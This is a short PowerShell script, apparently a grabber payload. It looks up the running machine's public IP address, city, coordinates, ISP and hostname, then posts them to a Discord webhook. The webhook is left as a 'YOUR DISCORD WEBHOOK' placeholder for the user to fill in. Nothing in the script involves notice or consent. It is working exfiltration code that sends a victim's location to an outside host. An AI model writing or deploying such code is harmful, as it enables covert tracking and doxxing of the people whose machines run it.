function Get-Geo {
    Param (
        [string]$wb = ""
    )

    $ipInfoApiUrl = "http://ip-api.com/json"
    $hostname = [System.Net.Dns]::GetHostName()

    try {
        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get
        if ($response.status -eq 'success') {
            $geoData = @{
                'IP'          = $response.query
                'Country'     = $response.country
                'Region'      = $response.regionName
                'City'        = $response.city
                'Latitude'    = $response.lat
                'Longitude'   = $response.lon
                'TimeZone'    = $response.timezone
                'ISP'         = $response.isp
            }
            $geoLocation = New-Object PSObject -Property $geoData

            if ($wb -ne "") {
                $discordData = @{
                    'content' = "**Hostname:** $hostname
                                **IP Address:** $($geoLocation.IP)
                                **Country:** $($geoLocation.Country)
                                **Region:** $($geoLocation.Region)
                                **City:** $($geoLocation.City)
                                **Latitude:** $($geoLocation.Latitude)
                                **Longitude:** $($geoLocation.Longitude)
                                **Time Zone:** $($geoLocation.TimeZone)
                                **ISP:** $($geoLocation.ISP)"
                } | ConvertTo-Json

                Invoke-RestMethod -Uri $wb -Method Post -Body $discordData -Headers @{
                    'Content-Type' = 'application/json'
                }
            }
        }
        else {
            Write-Error "Failed to retrieve geolocation information."
        }
    }
    catch {
        Write-Error "An error occurred while trying to fetch geolocation data: $_"
    }
}


Get-Geo -wb "YOUR DISCORD WEBHOOK"
